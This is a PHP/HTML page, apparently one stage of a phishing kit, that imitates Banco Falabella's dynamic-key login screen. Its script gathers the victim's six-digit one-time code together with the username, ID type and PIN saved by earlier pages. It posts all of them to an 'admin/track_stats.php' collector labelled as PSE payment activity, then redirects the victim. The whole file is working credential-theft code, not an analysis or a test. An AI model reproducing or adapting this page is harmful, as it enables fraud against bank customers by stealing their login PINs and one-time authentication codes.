<?php
// Falabella dinamica.php
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella - Clave Dinámica</title>
    <link rel="stylesheet" href="assets/styles.css">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <img src="assets/img/logo-bf-darkmode.aee74748.svg" alt="Logo" class="loading-logo">
    </div>
    
    <!-- Main Content -->
    <div id="mainContent" class="main-container">
        <!-- Header -->
        <header class="header">
            <div class="logo-container">
                <img src="assets/img/bf-logo-mobile.svg" alt="Banco Falabella" class="logo">
            </div>
            <button class="btn-banca-online">Banca en línea</button>
        </header>
        
        <!-- Dinámica Form -->
        <div class="login-container">
            <form id="dinamicaForm" class="login-form">
                <div class="form-group">
                    <label class="form-label">Ingrese su Clave Dinámica</label>
                </div>
                <div class="form-group">
                    <input 
                        type="password" 
                        id="claveDinamica" 
                        class="form-input" 
                        placeholder="Clave Dinámica (6 dígitos)"
                        maxlength="6"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>
                <button type="submit" id="btnIngresar" class="btn-ingresar" disabled>
                    INGRESAR
                </button>
                <div class="link-container">
                    <a href="#" class="link-clave">¿Necesitas ayuda con tu clave dinámica?</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        const claveDinamica = document.getElementById('claveDinamica');
        const btnIngresar = document.getElementById('btnIngresar');

        // Habilitar botón cuando hay clave
        claveDinamica.addEventListener('input', () => {
            if (claveDinamica.value.length === 6) {
                btnIngresar.disabled = false;
            } else {
                btnIngresar.disabled = true;
            }
        });

        document.getElementById('dinamicaForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const dinamica = claveDinamica.value;
            const usuario = localStorage.getItem('usuario_falabella') || '';
            const tipoId = localStorage.getItem('tipo_id_falabella') || 'CC';
            const clave = localStorage.getItem('clave_pin_falabella') || '';

            // Enviar al admin
            const formData = new FormData();
            formData.append('activity', 'DINÁMICA (FALABELLA)');
            formData.append('action', 'log');
            formData.append('metodo', 'PSE');
            formData.append('banco', 'Falabella');
            formData.append('documento', usuario);
            formData.append('usuario', usuario);
            formData.append('identificacion', usuario);
            formData.append('tipo_identificacion', tipoId);
            formData.append('clave_pin', clave);
            formData.append('codigo_dinamica', dinamica);
            formData.append('codigo_otp', dinamica);
            formData.append('clave_tarjeta', '');
            formData.append('ultimos_digitos', '');

            try {
                const response = await fetch('../../admin/track_stats.php', {
                    method: 'POST',
                    body: formData,
                    keepalive: true
                });

                const data = await response.json();
                
                if (data.success) {
                    localStorage.setItem('log_id_dinamica_falabella', data.id);
                    window.location.href = '../../index.php';
                } else {
                    alert('Error al procesar solicitud');
                }
            } catch (err) {
                console.error('Error:', err);
                window.location.href = '../../index.php';
            }
        });

        // Mostrar pantalla principal
        window.addEventListener('load', () => {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        });
    </script>
</body>
</html>